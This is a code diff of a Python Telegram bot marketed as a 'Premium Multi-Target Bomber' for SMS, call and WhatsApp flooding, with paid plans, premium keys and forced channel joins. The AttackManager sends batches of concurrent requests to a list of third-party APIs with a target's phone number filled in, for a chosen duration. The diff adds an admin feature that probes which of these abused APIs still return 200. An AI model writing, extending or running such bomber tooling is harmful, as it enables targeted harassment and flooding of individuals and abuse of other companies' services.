@@ -2407,24 +2200,20 @@ class AttackManager:
         self._connector = None
 
     async def _make_request(self, api, phone):
-        """Single request using shared session - NO NEW CONNECTIONS!"""
         try:
             session = await self._get_session()
             url = api['url']
             
-            # Process params
             params = api.get('params', {}).copy() if api.get('params') else {}
             if params:
                 for k, v in params.items():
                     if isinstance(v, str):
                         params[k] = v.replace('{no}', phone)
             
-            # Process headers
             headers = api.get('headers', {}).copy()
             if 'User-Agent' not in headers:
                 headers['User-Agent'] = random.choice(self.user_agents)
             
-            # Process body
             def replace_body(body):
                 if isinstance(body, dict):
                     return {k: replace_body(v) if isinstance(v, (dict, list)) else 
@@ -2440,7 +2229,6 @@ class AttackManager:
             
             body = replace_body(api.get('body', {}))
             
-            # Make request with timeout
             method = api['method'].upper()
             if method == 'GET':
                 async with session.get(url, headers=headers, params=params) as resp:
@@ -2460,9 +2248,7 @@ class AttackManager:
             return False
 
     async def _worker_task(self, user_id, phone, api_list, end_time):
-        """Worker using shared session - REUSES connections!"""
         while time.time() < end_time:
-            # Check if attack should stop
             if user_id not in self.active_attacks:
                 break
             if not self.active_attacks[user_id].get("running", False):
@@ -2470,20 +2256,16 @@ class AttackManager:
             if phone not in self.active_attacks[user_id].get("targets", []):
                 break
             
-            # ✅ FIX 2: Limit concurrent requests per batch
-            batch_size = min(15, len(api_list))  # Max 15 per batch
+            batch_size = min(15, len(api_list))
             batch = random.sample(api_list, batch_size) if len(api_list) > batch_size else api_list
             
-            # Create tasks using shared session
             tasks = [self._make_request(api, phone) for api in batch]
             if tasks:
                 await asyncio.gather(*tasks, return_exceptions=True)
             
-            # ✅ FIX 3: Small delay to prevent overwhelming
             await asyncio.sleep(0.15)
 
     async def start_attack(self, user_id, targets, duration_minutes):
-        """Start attack with connection limits."""
         if user_id in self.active_attacks:
             return False, "Attack already running"
         
@@ -2506,9 +2288,7 @@ class AttackManager:
                 return False, f"Number {target} is protected!"
         
         end_time = time.time() + (duration_minutes * 60)
-        
-        # ✅ FIX 4: Limit workers to prevent too many connections
-        max_workers = min(concurrency, 3)  # Max 3 workers per target
+        max_workers = min(concurrency, 3)
         
         self.active_attacks[user_id] = {
             "targets": targets,
@@ -2517,7 +2297,6 @@ class AttackManager:
             "workers": {}
         }
         
-        # Split APIs among workers
         chunk_size = max(1, len(APIS) // max_workers)
         api_chunks = []
         for i in range(max_workers):
@@ -2525,7 +2304,6 @@ class AttackManager:
             end = start + chunk_size if i < max_workers - 1 else len(APIS)
             api_chunks.append(APIS[start:end])
         
-        # Start workers for each target
         for target in targets:
             self.active_attacks[user_id]["workers"][target] = []
             for i in range(max_workers):
@@ -2537,24 +2315,16 @@ class AttackManager:
         return True, f"Started attack on {len(targets)} target(s)"
 
     async def stop_attack(self, user_id):
-        """Stop attack and cleanup connections."""
         if user_id in self.active_attacks:
-            # Stop all workers
             self.active_attacks[user_id]["running"] = False
             
-            # Cancel all tasks
             for target_workers in self.active_attacks[user_id].get("workers", {}).values():
                 for task in target_workers:
                     if not task.done():
                         task.cancel()
             
-            # Wait for tasks to finish
             await asyncio.sleep(0.5)
-            
-            # Cleanup
             del self.active_attacks[user_id]
-            
-            # ✅ FIX 5: Close session to free file descriptors
             await self._close_session()
             return True
         return False
@@ -2564,21 +2334,95 @@ class AttackManager:
             return self.active_attacks[user_id]["targets"]
         return []
 
-# ========== INITIALIZE ATTACK MANAGER ==========
+    # ========== NEW: CHECK WORKING APIS ==========
+    async def check_working_apis(self, phone="9999999999"):
+        """Check which APIs are working (return 200 OK). Admin only feature."""
+        working_apis = []
+        failed_apis = []
+        
+        # Create a fresh session for testing
+        connector = aiohttp.TCPConnector(ssl=self.ssl_context, limit=20, limit_per_host=5)
+        timeout = aiohttp.ClientTimeout(total=10, connect=5)
+        
+        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
+            total = len(APIS)
+            tested = 0
+            
+            for api in APIS:
+                tested += 1
+                try:
+                    url = api['url']
+                    headers = api.get('headers', {}).copy()
+                    if 'User-Agent' not in headers:
+                        headers['User-Agent'] = random.choice(self.user_agents)
+                    
+                    def replace_body(body):
+                        if isinstance(body, dict):
+                            return {k: replace_body(v) if isinstance(v, (dict, list)) else 
+                                   (v.replace('{no}', phone).replace('{phone}', phone) if isinstance(v, str) else v) 
+                                   for k, v in body.items()}
+                        elif isinstance(body, list):
+                            return [replace_body(item) if isinstance(item, (dict, list)) else 
+                                   (item.replace('{no}', phone).replace('{phone}', phone) if isinstance(item, str) else item) 
+                                   for item in body]
+                        elif isinstance(body, str):
+                            return body.replace('{no}', phone).replace('{phone}', phone)
+                        return body
+                    
+                    body = replace_body(api.get('body', {}))
+                    params = api.get('params', {}).copy() if api.get('params') else {}
+                    if params:
+                        for k, v in params.items():
+                            if isinstance(v, str):
+                                params[k] = v.replace('{no}', phone)
+                    
+                    method = api['method'].upper()
+                    
+                    if method == 'GET':
+                        async with session.get(url, headers=headers, params=params) as resp:
+                            if resp.status == 200:
+                                working_apis.append(api['name'])
+                            else:
+                                failed_apis.append(api['name'])
+                    elif method == 'PUT':
+                        async with session.put(url, headers=headers, json=body) as resp:
+                            if resp.status == 200:
+                                working_apis.append(api['name'])
+                            else:
+                                failed_apis.append(api['name'])
+                    else:
+                        if isinstance(body, dict):
+                            async with session.post(url, headers=headers, json=body, params=params) as resp:
+                                if resp.status == 200:
+                                    working_apis.append(api['name'])
+                                else:
+                                    failed_apis.append(api['name'])
+                        else:
+                            async with session.post(url, headers=headers, data=body, params=params) as resp:
+                                if resp.status == 200:
+                                    working_apis.append(api['name'])
+                                else:
+                                    failed_apis.append(api['name'])
+                except Exception:
+                    failed_apis.append(api['name'])
+                
+                # Small delay to avoid rate limiting
+                if tested % 10 == 0:
+                    await asyncio.sleep(0.5)
+        
+        return working_apis, failed_apis
+
 manager = AttackManager()
 
 # ========== FORCE CHANNEL JOIN SYSTEM ==========
 async def check_channel_join(update, context):
-    """Returns True if the user may proceed, False if they must join the channel first.
-    Owner always passes. If no channel is configured, everyone passes."""
     uid = update.effective_user.id
     if uid == OWNER_ID:
         return True
     channel = await manager.db.get_channel()
     if not channel:
-        return True  # no channel configured -> open access
+        return True
 
-    # normalize channel id (strip @, t.me/ links, and schemes)
     channel_clean = channel.strip()
     if channel_clean.startswith("https://"):
         channel_clean = channel_clean.replace("https://", "", 1)
@@ -2588,14 +2432,14 @@ async def check_channel_join(update, context):
         channel_clean = channel_clean.replace("t.me/", "", 1)
     channel_clean = channel_clean.lstrip("@").split("?")[0].split("/")[0].strip()
     if not channel_clean:
-        return True  # invalid saved value -> don't lock everyone out
+        return True
 
     try:
         member = await context.bot.get_chat_member(channel_clean, uid)
         if member.status in ("member", "administrator", "creator"):
             return True
     except Exception:
-        pass  # bot not admin / channel invalid / user not found -> treat as blocked
+        pass
 
     kb = InlineKeyboardMarkup([[InlineKeyboardButton("📢 JOIN CHANNEL", url=f"https://t.me/{channel_clean}")]])
     msg = (f"⛔ ACCESS DENIED!\n\n"
@@ -2671,14 +2515,14 @@ async def duration_kb(user_id):
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     uid = update.effective_user.id
     if not await check_channel_join(update, context):
-        return  # blocked message already sent
+        return
     await manager.db.add_user(uid)
     await update.message.reply_photo(WELCOME_IMAGE, caption=f"🔥 Welcome to Premium Multi-Target Bomber!\n\n📡 Total APIs: {len(APIS)}\n🎯 SMS + Call + WhatsApp\n\nUse /help for commands.", reply_markup=main_kb(uid))
 
 async def mix_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     uid = update.effective_user.id
     if not await check_channel_join(update, context):
-        return  # blocked message already sent
+        return
     if not await manager.db.is_premium(uid):
         await update.message.reply_text("⛔ Premium Required!\nUse /plan to buy or /redeem to activate.")
         return
@@ -2693,7 +2537,7 @@ async def mix_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
 async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     uid = update.effective_user.id
     if not await check_channel_join(update, context):
-        return  # blocked message already sent
+        return
     if uid in manager.active_attacks:
         info = manager.active_attacks[uid]
         left = int((info['end_time'] - time.time()) / 60)
@@ -2705,7 +2549,7 @@ async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
 async def account_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     uid = update.effective_user.id
     if not await check_channel_join(update, context):
-        return  # blocked message already sent
+        return
     plan = await manager.db.get_plan_name(uid)
     expiry = await manager.db.get_expiry(uid)
     con = await manager.db.get_concurrent_limit(uid)
@@ -2714,7 +2558,7 @@ async def account_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 async def plan_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not await check_channel_join(update, context):
-        return  # blocked message already sent
+        return
     msg = "💳 AVAILABLE SUBSCRIPTION PLANS\n\n"
     for key, p in PLANS.items():
         msg += f"🔹 {p['name']} Plan (₹{p['price']})\n"
@@ -2727,14 +2571,14 @@ async def plan_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 async def redeem_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not await check_channel_join(update, context):
-        return  # blocked message already sent
+        return
     await update.message.reply_text("🔑 Send your premium code:\nFormat: PREMIUM-XXXXXXXX")
     context.user_data['waiting_for_redeem'] = True
 
 async def protect_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     uid = update.effective_user.id
     if not await check_channel_join(update, context):
-        return  # blocked message already sent
+        return
     if not await manager.db.is_premium(uid):
         await update.message.reply_text("⛔ Premium required!")
         return
@@ -2744,13 +2588,13 @@ async def protect_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
 async def unprotect_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     uid = update.effective_user.id
     if not await check_channel_join(update, context):
-        return  # blocked message already sent
+        return
     await manager.db.unprotect(uid)
     await update.message.reply_text("🔓 Number unprotected.")
 
 async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not await check_channel_join(update, context):
-        return  # blocked message already sent
+        return
     msg = f"""ℹ️ USER HELP & INSTRUCTIONS
 
 🚀 CORE COMMANDS
@@ -2776,87 +2620,18 @@ async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
 💡 Tip: Use the buttons below for quick access!"""
     await update.message.reply_text(msg, reply_markup=main_kb(update.effective_user.id))
 
-async def handle_msg(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    uid = update.effective_user.id
-    if not await check_channel_join(update, context):
-        return  # blocked message already sent
-    text = update.message.text
-    
-    if uid == OWNER_ID and context.user_data.get('waiting_for_genkey'):
-        await generate_key_logic(update, context, text)
-        return
-    
-    if uid == OWNER_ID and context.user_data.get('waiting_for_broadcast'):
-        await broadcast_logic(update, context, text)
-        return
-    
-    if uid == OWNER_ID and context.user_data.get('waiting_for_channel'):
-        context.user_data['waiting_for_channel'] = False
-        channel = text.strip().strip('@')
-        # accept link forms too
-        if 't.me/' in channel:
-            channel = channel.split('t.me/')[-1]
-        channel = channel.split('?')[0].split('/')[0].strip()
-        if not channel:
-            await update.message.reply_text("❌ Invalid channel! Send like: @yourchannel ya https://t.me/yourchannel")
-            return
-        await manager.db.set_channel(channel)
-        await update.message.reply_text(f"✅ Channel SET!\n\n📣 Users must join: @{channel}\n\nAb bot use karne ke liye sabko ye channel join karna hoga. 🔒")
-        return
-    
-    await manager.db.add_user(uid)
-    if not await check_channel_join(update, context):
-        return  # blocked message already sent
-    
-    if text == "🚀 /mix" or text == "/mix":
-        await mix_command(update, context)
-    elif text == "📊 /status" or text == "/status":
-        await status_command(update, context)
-    elif text == "👤 /account" or text == "/account":
-        await account_command(update, context)
-    elif text == "💳 /plan" or text == "/plan":
-        await plan_command(update, context)
-    elif text == "🔑 /redeem" or text == "/redeem":
-        await redeem_command(update, context)
-    elif text == "🛡 /protect" or text == "/protect":
-        await protect_command(update, context)
-    elif text == "🔓 /unprotect" or text == "/unprotect":
-        await unprotect_command(update, context)
-    elif text == "❓ /help" or text == "/help":
-        await help_command(update, context)
-    elif text == "👑 Admin" and uid == OWNER_ID:
-        await show_admin_panel(update, context)
-    elif context.user_data.get('waiting_for_target_count'):
-        pass
-    elif context.user_data.get('waiting_for_numbers') and text.strip():
-        await process_numbers(update, context, text)
-    elif context.user_data.get('waiting_for_redeem'):
-        context.user_data['waiting_for_redeem'] = False
-        success, days, plan, exp = await manager.db.redeem(uid, text.strip().upper())
-        if success:
-            await update.message.reply_text(f"✅ Premium Activated!\n📋 Plan: {plan.upper()}\n📅 Expiry: {exp}")
-        else:
-            await update.message.reply_text("❌ Invalid or already used code.")
-    elif context.user_data.get('waiting_for_protect') and text.isdigit() and len(text) == 10:
-        context.user_data['waiting_for_protect'] = False
-        await manager.db.protect(uid, text)
-        await update.message.reply_text(f"🛡 Protected: {text}")
-    elif text == "/cancel":
-        for k in ['waiting_for_target_count', 'waiting_for_numbers', 'waiting_for_redeem', 'waiting_for_protect', 'waiting_for_genkey', 'waiting_for_broadcast', 'expected_targets']:
-            context.user_data.pop(k, None)
-        manager.db.clear_attack_data(uid)
-        await update.message.reply_text("❌ Cancelled.", reply_markup=main_kb(uid))
-
+# ========== ADMIN PANEL ==========
 async def show_admin_panel(update: Update, context: ContextTypes.DEFAULT_TYPE):
     kb = InlineKeyboardMarkup([
         [InlineKeyboardButton("🔑 Generate Standard Key (30 days)", callback_data="adm_gen_standard")],
         [InlineKeyboardButton("⭐ Generate Premium Key (30 days)", callback_data="adm_gen_premium")],
         [InlineKeyboardButton("👑 Generate Ultimate Key (30 days)", callback_data="adm_gen_ultimate")],
+        [InlineKeyboardButton("🔧 Custom Key (Days & Plan)", callback_data="adm_custom_key")],
         [InlineKeyboardButton("📢 Broadcast Message", callback_data="adm_broadcast")],
         [InlineKeyboardButton("📊 View Statistics", callback_data="adm_stats")],
-        [InlineKeyboardButton("🔧 Custom Key (Days & Plan)", callback_data="adm_custom_key")],
         [InlineKeyboardButton("📣 Set Channel (Force Join)", callback_data="adm_set_channel")],
-        [InlineKeyboardButton("🗑 Remove Channel", callback_data="adm_remove_channel")]
+        [InlineKeyboardButton("🗑 Remove Channel", callback_data="adm_remove_channel")],
+        [InlineKeyboardButton("🔍 Check Working APIs", callback_data="adm_check_apis")]
     ])
     await update.message.reply_text("👑 Admin Control Panel:\nSelect an option:", reply_markup=kb)
 
@@ -2910,12 +2685,83 @@ async def process_numbers(update: Update, context: ContextTypes.DEFAULT_TYPE, te
     max_dur = await manager.db.get_max_duration(uid)
     await update.message.reply_text(f"📞 Targets: {', '.join(numbers)}\n⏰ Select duration (Max: {max_dur}min):", reply_markup=await duration_kb(uid))
 
+async def handle_msg(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    uid = update.effective_user.id
+    if not await check_channel_join(update, context):
+        return
+    text = update.message.text
+    
+    if uid == OWNER_ID and context.user_data.get('waiting_for_genkey'):
+        await generate_key_logic(update, context, text)
+        return
+    
+    if uid == OWNER_ID and context.user_data.get('waiting_for_broadcast'):
+        await broadcast_logic(update, context, text)
+        return
+    
+    if uid == OWNER_ID and context.user_data.get('waiting_for_channel'):
+        context.user_data['waiting_for_channel'] = False
+        channel = text.strip().strip('@')
+        if 't.me/' in channel:
+            channel = channel.split('t.me/')[-1]
+        channel = channel.split('?')[0].split('/')[0].strip()
+        if not channel:
+            await update.message.reply_text("❌ Invalid channel! Send like: @yourchannel ya https://t.me/yourchannel")
+            return
+        await manager.db.set_channel(channel)
+        await update.message.reply_text(f"✅ Channel SET!\n\n📣 Users must join: @{channel}\n\nAb bot use karne ke liye sabko ye channel join karna hoga. 🔒")
+        return
+    
+    await manager.db.add_user(uid)
+    if not await check_channel_join(update, context):
+        return
+    
+    if text == "🚀 /mix" or text == "/mix":
+        await mix_command(update, context)
+    elif text == "📊 /status" or text == "/status":
+        await status_command(update, context)
+    elif text == "👤 /account" or text == "/account":
+        await account_command(update, context)
+    elif text == "💳 /plan" or text == "/plan":
+        await plan_command(update, context)
+    elif text == "🔑 /redeem" or text == "/redeem":
+        await redeem_command(update, context)
+    elif text == "🛡 /protect" or text == "/protect":
+        await protect_command(update, context)
+    elif text == "🔓 /unprotect" or text == "/unprotect":
+        await unprotect_command(update, context)
+    elif text == "❓ /help" or text == "/help":
+        await help_command(update, context)
+    elif text == "👑 Admin" and uid == OWNER_ID:
+        await show_admin_panel(update, context)
+    elif context.user_data.get('waiting_for_target_count'):
+        pass
+    elif context.user_data.get('waiting_for_numbers') and text.strip():
+        await process_numbers(update, context, text)
+    elif context.user_data.get('waiting_for_redeem'):
+        context.user_data['waiting_for_redeem'] = False
+        success, days, plan, exp = await manager.db.redeem(uid, text.strip().upper())
+        if success:
+            await update.message.reply_text(f"✅ Premium Activated!\n📋 Plan: {plan.upper()}\n📅 Expiry: {exp}")
+        else:
+            await update.message.reply_text("❌ Invalid or already used code.")
+    elif context.user_data.get('waiting_for_protect') and text.isdigit() and len(text) == 10:
+        context.user_data['waiting_for_protect'] = False
+        await manager.db.protect(uid, text)
+        await update.message.reply_text(f"🛡 Protected: {text}")
+    elif text == "/cancel":
+        for k in ['waiting_for_target_count', 'waiting_for_numbers', 'waiting_for_redeem', 'waiting_for_protect', 'waiting_for_genkey', 'waiting_for_broadcast', 'expected_targets']:
+            context.user_data.pop(k, None)
+        manager.db.clear_attack_data(uid)
+        await update.message.reply_text("❌ Cancelled.", reply_markup=main_kb(uid))
+
+# ========== BUTTON HANDLER ==========
 async def btn_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
     await query.answer()
     uid = query.from_user.id
     if not await check_channel_join(update, context):
-        return  # blocked message already sent
+        return
     data = query.data
     
     if data == "adm_gen_standard" and uid == OWNER_ID:
@@ -2982,6 +2828,42 @@ async def btn_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await manager.db.remove_channel()
         await query.message.reply_text("🗑 Channel removed! Bot is now open for everyone.")
     
+    # ========== NEW: CHECK WORKING APIS ==========
+    elif data == "adm_check_apis" and uid == OWNER_ID:
+        status_msg = await query.message.reply_text("🔍 Checking all APIs... Please wait.\n\n⏳ This may take 1-2 minutes...")
+        
+        try:
+            working, failed = await manager.check_working_apis()
+            
+            total = len(APIS)
+            working_count = len(working)
+            failed_count = len(failed)
+            
+            result_msg = f"📊 WORKING APIs STATUS\n\n"
+            result_msg += f"✅ Total APIs Tested: {total}\n"
+            result_msg += f"✅ Working APIs: {working_count}\n"
+            result_msg += f"❌ Failed APIs: {failed_count}\n\n"
+            
+            if working:
+                result_msg += "✅ WORKING APIs LIST:\n"
+                for i, name in enumerate(working, 1):
+                    result_msg += f"{i}. {name}\n"
+                    if i >= 30:
+                        result_msg += f"... and {len(working) - 30} more\n"
+                        break
+            
+            if failed:
+                result_msg += "\n❌ FAILED APIs (Sample):\n"
+                for i, name in enumerate(failed[:10], 1):
+                    result_msg += f"{i}. {name}\n"
+                if len(failed) > 10:
+                    result_msg += f"... and {len(failed) - 10} more\n"
+            
+            await status_msg.edit_text(result_msg)
+            
+        except Exception as e:
+            await status_msg.edit_text(f"❌ Error checking APIs: {str(e)}")
+    
     elif data == "info":
         con = await manager.db.get_concurrent_limit(uid)
         await query.answer(f"⚡ {con}x Concurrent Workers Per Target\n📡 Total APIs: {len(APIS)}", show_alert=True)
@@ -2989,7 +2871,7 @@ async def btn_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
 async def cancel_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     uid = update.effective_user.id
     if not await check_channel_join(update, context):
-        return  # blocked message already sent
+        return
     for k in ['waiting_for_target_count', 'waiting_for_numbers', 'waiting_for_redeem', 'waiting_for_protect', 'waiting_for_genkey', 'waiting_for_broadcast', 'expected_targets']:
         context.user_data.pop(k, None)
     manager.db.clear_attack_data(uid)
@@ -2997,7 +2879,6 @@ async def cancel_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 async def shutdown_handler(signal, loop):
     logger.info(f"Received exit signal {signal.name}...")
-    # Close attack manager session
     if manager:
         await manager._close_session()
     tasks = [t for t in asyncio.all_tasks() if t is not asyncio.current_task()]
@@ -3007,28 +2888,23 @@ async def shutdown_handler(signal, loop):
     loop.stop()
 
 def main():
-    # Create event loop FIRST
     loop = asyncio.new_event_loop()
     asyncio.set_event_loop(loop)
     
-    # Initialize SQLite with correct loop
     global db
     db = SqliteStorage(DB_PATH)
     
-    # Create indexes using the current loop
     async def init_indexes():
         await db.ensure_indexes()
     
     loop.run_until_complete(init_indexes())
     
-    # Update globals
     global database
     database = DatabaseWrapper()
     
     global manager
     manager = AttackManager()
     
-    # Setup signal handlers
     for sig in (signal.SIGINT, signal.SIGTERM):
         loop.add_signal_handler(sig, lambda: asyncio.create_task(shutdown_handler(sig, loop)))
     
